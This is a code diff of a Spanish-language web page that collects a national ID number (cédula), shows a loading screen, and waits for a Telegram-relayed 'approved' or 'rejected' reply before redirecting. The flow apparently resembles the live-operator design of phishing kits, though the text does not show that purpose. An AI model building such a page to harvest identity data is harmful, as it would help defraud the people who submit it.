@@ -59,28 +59,31 @@
 
     <script>
         const socket = io();
-
+    
         document.getElementById('cedulaForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(e.target);
-
+    
             // Mostrar la pantalla de carga
             document.getElementById('loading').style.display = 'block';
             document.getElementById('formContainer').style.display = 'none';
-
+    
             await fetch('/submit_cedula', {
                 method: 'POST',
                 body: formData,
             });
-
+    
             // Esperar respuesta desde Telegram
             socket.on('telegram_response', (data) => {
-                if (data.response) {
-                    // Redirigir a la página de respuesta con el mensaje recibido
-                    window.location.href = `/response?message=${encodeURIComponent(data.response)}`;
+                if (data.response === 'approved') {
+                    // Redirigir a la página de respuesta
+                    window.location.href = `/response?message=Aprobado`;
+                } else if (data.response === 'rejected') {
+                    // Redirigir a la página principal
+                    window.location.href = `/`;
                 }
             });
         });
-    </script>
+    </script>   
 </body>
 </html>
